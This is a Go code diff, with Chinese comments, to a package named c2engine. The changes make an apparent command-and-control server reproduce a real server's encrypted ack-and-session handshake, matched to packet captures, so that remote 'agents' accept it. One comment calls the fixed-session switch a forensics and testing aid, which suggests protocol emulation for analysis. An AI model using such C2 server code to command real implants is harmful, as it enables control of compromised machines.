@@ -23,6 +23,7 @@ package c2engine
 
 import (
 	"bufio"
+	"crypto/md5"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
@@ -345,13 +346,23 @@ func (c *officialConn) handle(plain []byte) error {
 					return err
 				}
 			default:
-				if err := c.send([]byte{0x01}); err != nil {
+				// 真实服务端把 ack 与会话合并在**同一个 TCP 段**里（抓包 81 字节 = 33+48），
+				// 这里同样合并成一次写，避免 agent 依赖单段读取。
+				ack, err := FrameEncrypt([]byte{0x01}, s.salt)
+				if err != nil {
 					return err
 				}
-				// 会话 ID（16 字节文本）
-				if err := c.send([]byte(officialSessionID())); err != nil {
+				sess, err := FrameEncrypt([]byte(officialSessionID()), s.salt)
+				if err != nil {
 					return err
 				}
+				c.wmu.Lock()
+				_, werr := c.conn.Write(append(ack, sess...))
+				c.wmu.Unlock()
+				if werr != nil {
+					return werr
+				}
+				s.Logf("official-tcp: -> %s ack+session (%d bytes, single write)", c.conn.RemoteAddr(), len(ack)+len(sess))
 			}
 			c.state = "done"
 			s.mu.Lock()
@@ -471,9 +482,23 @@ func (s *OfficialTCPServer) RunCommand(cmd string, timeout time.Duration) (strin
 // FixedSessionForTest 允许把会话 ID 固定成已知值（仅用于取证/测试，走环境变量）。
 var FixedSessionForTest = ""
 
+// SessionFromVkeyForTest 非空时，用 md5(vkey)[:12] 的 base64 作为会话 ID（实验开关）。
+var SessionFromVkeyForTest = ""
+
+// md5Sum 是 md5 的小包装（避免在多个文件重复 import）。
+func md5Sum(b []byte) []byte {
+	sum := md5.Sum(b)
+	return sum[:]
+}
+
 func officialSessionID() string {
 	if FixedSessionForTest != "" {
 		return FixedSessionForTest
+	}
+	if SessionFromVkeyForTest != "" {
+		// 实验：会话 = base64(md5(vkey)[:12])，用于验证 agent 是否校验会话与 vkey 的关系
+		raw := md5Sum([]byte(SessionFromVkeyForTest))
+		return base64.StdEncoding.EncodeToString(raw[:12])
 	}
 	// 抓包里的会话 ID（如 FQ0022pIHROm5ibh）是 **12 字节随机数的 base64**（16 字符）；
 	// 用普通字母数字串时 agent 收到后会直接关闭连接（R26 实测）。
